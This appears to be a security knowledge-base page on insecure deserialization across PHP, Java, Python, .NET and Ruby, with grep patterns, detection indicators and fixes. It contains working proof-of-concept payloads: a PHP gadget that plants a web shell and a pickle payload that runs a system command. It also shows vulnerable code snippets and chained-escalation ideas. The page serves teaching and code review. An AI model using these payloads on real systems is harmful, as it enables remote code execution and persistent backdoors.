# Insecure Deserialization

**Tags:** #critical #deserialization #rce #java #php #python #dotnet
**OWASP:** A08:2021 Software and Data Integrity Failures
**CVSS Base:** 9.8 (Critical → RCE by design)

---

## 📖 What is it

Deserialization of untrusted data is one of the few vulnerabilities that guarantees RCE by design. The attacker controls the serialized data and, when deserialized by the server, executes arbitrary code via "gadget chains" — sequences of legitimate objects chained together maliciously.

---

## 🔍 `grep_search` by Language

```
# PHP
unserialize(

# Java
ObjectInputStream(
readObject(
readUnshared(

# Python
pickle.loads(
pickle.load(
cPickle
shelve.open(

# .NET
BinaryFormatter
NetDataContractSerializer
SoapFormatter
JavaScriptSerializer

# Ruby
Marshal.load(
YAML.load(

# Node.js
node-serialize
serialize-javascript
```

---

## 💣 Exploitation by Language

### 🐘 PHP — `unserialize()`

**Exploited magic methods:**
- `__wakeup()` → called automatically upon deserialization
- `__destruct()` → called when the object is destroyed
- `__toString()` → called when the object is converted to a string

```php
//  VULNERABLE — input from cookie/GET/POST
$data = unserialize($_COOKIE['user_data']);
$data = unserialize(base64_decode($_GET['obj']));
```

**PoC Payload — PHP Object Injection:**
```php
<?php
class Logger {
    public $log_file = "/var/www/html/shell.php";
    public $log_data = "<?php system($_GET['cmd']); ?>";

    function __destruct() {
        file_put_contents($this->log_file, $this->log_data);
    }
}

$payload = serialize(new Logger());
echo base64_encode($payload);
```

---

### ☕ Java — `ObjectInputStream`

**Known Gadget Chains (via ysoserial):**

| Gadget | Library | Condition |
|---|---|---|
| CommonsCollections1-7 | Apache Commons Collections ≤ 3.2.1 | On classpath |
| Spring1 | Spring Framework | On classpath |
| Groovy1 | Groovy | On classpath |
| JBoss | JBoss | On classpath |
| WebLogic | Oracle WebLogic | Older unpatched versions |

```java
//  VULNERABLE
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // RCE if gadget chain is available
```

**Detection of Java serialized magic bytes:**
```
Bytes: AC ED 00 05  (hex) = rO0AB (base64 prefix)
```

---

### 🐍 Python — `pickle`

```python
#  VULNERABLE
import pickle, base64
data = pickle.loads(base64.b64decode(request.form['data']))
```

**PoC — RCE payload via `__reduce__`:**
```python
import pickle, os, base64

class RCEPayload(object):
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))

payload = base64.b64encode(pickle.dumps(RCEPayload()))
print(payload.decode())
# Send this payload in the 'data' field
```

---

### 🔷 .NET — `BinaryFormatter`

> `BinaryFormatter` has been officially **deprecated by Microsoft** for being insecure by design.

```csharp
//  VULNERABLE — BinaryFormatter
BinaryFormatter bf = new BinaryFormatter();
object obj = bf.Deserialize(stream);  // RCE if gadget is available
```

**Main Gadget:** `TypeConfuseDelegate`  
**Tools:** ysoserial.net

---

### 💎 Ruby — `Marshal.load`

```ruby
#  VULNERABLE
data = Marshal.load(Base64.decode64(params[:data]))
```

---

## 🧠 Detection in REST/API Code

> Pay attention to endpoints that receive binary-encoded data or custom formats:

```
- Parameters with long base64 values in cookies or body
- Endpoints that accept Content-Type: application/octet-stream
- Headers containing AC ED 00 05 or rO0AB (Java serialized)
- Cookies with O:8:"ClassName" (PHP serialized)
```

---

## 🛡️ Fix

### PHP
```php
//  Use JSON instead of native serialization
$data = json_decode($_COOKIE['user_data'], true);

//  If serialization is necessary: HMAC for integrity
$serialized = base64_encode(serialize($safe_object));
$hmac = hash_hmac('sha256', $serialized, SECRET_KEY);
// Verify HMAC before deserializing
```

### Java
```java
//  Allowlist filter for permitted classes
ObjectInputStream ois = new ObjectInputStream(stream) {
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException {
        if (!ALLOWED_CLASSES.contains(desc.getName())) {
            throw new InvalidClassException("Class not allowed: " + desc.getName());
        }
        return super.resolveClass(desc);
    }
};
```

### Python
```python
#  Use JSON or msgpack instead of pickle for external data
import json
data = json.loads(request.form['data'])

#  If serialization is needed: cryptography.fernet for integrity
from cryptography.fernet import Fernet
f = Fernet(key)
data = f.decrypt(token)  # only decrypts if HMAC matches
```

---

## 🔗 Chain Exploits

```
Deserialization RCE + root container → Container escape
Deserialization RCE + credentials in env → Full secrets dump
PHP Object Injection + webshell write → Persistent backdoor
Java Deserialization + /admin endpoint → Compromise without credentials
```

---

## 📌 References
- [[command-injection-rce]]
- [[iac-security-docker-kubernetes-terraform]]
- [ysoserial (Java)](https://github.com/frohoff/ysoserial)
- [OWASP Deserialization](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)